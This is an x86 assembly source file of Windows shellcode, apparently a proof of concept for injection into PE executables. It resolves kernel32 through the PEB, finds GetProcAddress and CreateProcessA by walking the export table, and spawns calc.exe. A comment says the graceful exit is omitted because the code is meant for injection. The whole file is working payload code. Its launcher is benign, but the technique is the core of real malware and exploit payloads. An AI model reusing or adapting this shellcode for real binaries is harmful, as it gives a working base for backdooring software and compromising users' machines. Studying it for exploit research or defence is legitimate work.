global _start

section .text
_start:	
	getkernel32:
		xor ecx, ecx                ; zeroing register ECX
		mul ecx                     ; zeroing register EAX EDX
		mov eax, [fs:ecx + 0x030]   ; PEB loaded in eax
		mov eax, [eax + 0x00c]      ; LDR loaded in eax
		mov esi, [eax + 0x014]      ; InMemoryOrderModuleList loaded in esi
		lodsd                       ; program.exe address loaded in eax (1st module)
		xchg esi, eax				
		lodsd                       ; ntdll.dll address loaded (2nd module)
		mov ebx, [eax + 0x10]       ; kernel32.dll address loaded in ebx (3rd module)

		; ebx = base of kernel32.dll address

	getAddressofName:
		mov edx, [ebx + 0x3c]       ; load e_lfanew address in ebx
		add edx, ebx				
		mov edx, [edx + 0x78]       ; load data directory
		add edx, ebx
		mov esi, [edx + 0x20]       ; load "address of name"
		add esi, ebx
		xor ecx, ecx

		; esi = RVAs

	getProcAddress:
		inc ecx
		lodsd                               ; get "address of name" in eax
		add eax, ebx				
		cmp dword [eax], 0x50746547         ; GetP
		jnz getProcAddress
		cmp dword [eax + 0x4], 0x41636F72   ; rocA
		jnz getProcAddress
		cmp dword [eax + 0x8], 0x65726464   ; ddre
		jnz getProcAddress

	getProcAddressFunc:
		mov esi, [edx + 0x24]       ; offset ordinals
		add esi, ebx                ; pointer to the name ordinals table
		mov cx, [esi + ecx * 2]     ; cx = Number of function
		dec ecx
		mov esi, [edx + 0x1c]       ; esi = Offset address table
		add esi, ebx                ; we placed at the begin of AddressOfFunctions array
		mov edx, [esi + ecx * 4]    ; edx = Pointer(offset)
		add edx, ebx                ; edx = getProcAddress
		mov ebp, edx

		; ebp = getProcAddress

	getCreateProcessA:
		xor ecx, ecx
		push 0x61614173	                ; aaAs
		sub word [esp + 0x2], 0x6161    ; aaAs - aa
		push 0x7365636f                 ; ecor
		push 0x72506574                 ; rPet
		push 0x61657243                 ; aerC
		push esp                        ; push the pointer to stack
		push ebx 						
		call edx                        ; call getprocAddress

	zero_memory:
		xor ecx, ecx                ; zero out counter register
		mov cl, 0xff                ; we'll loop 255 times (0xff)
		xor edi, edi                ; edi now 0x00000000

		zero_loop:
		push edi                    ; place 0x00000000 on stack 255 times
		loop zero_loop
		
	getcalc:
		push 0x636c6163             ; 'calc' 0x636c6163 'notepad' 0x6578652e64617065746f6e
		mov ecx, esp                ; stack pointer to 'calc'
		push ecx                    ; processinfo pointing to 'calc' as a struct argument
		push ecx                    ; startupinfo pointing to 'calc' as a struct argument
		xor edx, edx                ; zero out
		push edx                    ; NULLS
		push edx
		push edx
		push edx
		push edx
		push edx
		push ecx                    ; 'calc'
		push edx
		call eax                    ; call CreateProcessA and spawn calc
		pop ecx
		pop ecx

		; Data we dont want to run but store
		jmp data_end
		data_start:
			injected_data_store_PoC: db 0xDEADBEEF
		data_end:

	; getExitProcess:				; Graceful exit; not what we want when injecting into PE
	; 	add esp, 0x010              ; clean the stack
	; 	push 0x61737365	            ; asse
	; 	sub word [esp + 0x3], 0x61  ; asse -a 
	; 	push 0x636F7250             ; corP
	; 	push 0x74697845             ; tixE
	; 	push esp
	; 	push ebx
	; 	call ebp

	; 	xor ecx, ecx
	; 	push ecx
	; 	call eax